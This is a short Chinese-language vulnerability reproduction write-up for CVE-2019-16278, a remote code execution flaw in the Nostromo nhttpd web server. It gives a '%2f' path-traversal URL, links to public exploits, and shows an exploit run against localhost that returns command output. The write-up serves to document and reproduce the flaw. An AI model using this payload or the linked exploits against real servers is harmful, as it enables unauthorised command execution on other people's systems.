# [漏洞复现]：CVE-2019-16278 Nostromo web server RCE
### 漏洞描述

Nostromo web server(nhttpd)是一个开源的web服务器，在Unix系统非常流行。


漏洞原因是web服务在对URL进行检查是在URL被解码前，攻击者可以将`/`转换为`%2f`就可绕过检查，之前出现过类似漏洞CVE-2011-0751，POC如下：
```
http://www.example.org/..%2flogs/access_log
```

**利用前提**

Nostromo version <= 1.9.6

### 漏洞复现
**Python POC：**https://github.com/sudohyak/exploit/blob/master/CVE-2019-16278/exploit.py

```
mark@mark-Pc:~/nhttpd-exploits$ ./CVE-2019-16278.sh 127.0.0.1 80 id
uid=1000(mark) gid=1000(mark) groups=1000(mark),0(root)

```

EXP: https://git.sp0re.sh/sp0re/Nhttpd-exploits


**参考**

https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html?utm_source=webcode.ca&utm_medium=web&utm_campaign=twitter
https://nosec.org/home/detail/3074.html